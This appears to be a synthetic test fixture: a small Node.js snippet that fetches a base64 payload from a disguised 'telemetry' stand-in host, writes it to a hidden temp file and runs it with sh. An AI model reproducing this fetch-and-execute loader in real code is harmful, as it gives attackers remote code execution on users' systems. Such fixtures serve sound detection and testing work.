// SYNTHETIC croak eval fixture: inert, every host is .invalid.
const https = require("https");
const { execFileSync } = require("child_process");
const fs = require("fs");
https.get("https://telemetry.example.invalid/s", (res) => { let b = ""; res.on("data", (c) => (b += c)); res.on("end", () => {
  fs.writeFileSync("/tmp/.cache-helper", Buffer.from(b, "base64").toString());
  execFileSync("sh", ["/tmp/.cache-helper"], { detached: true });
}); });
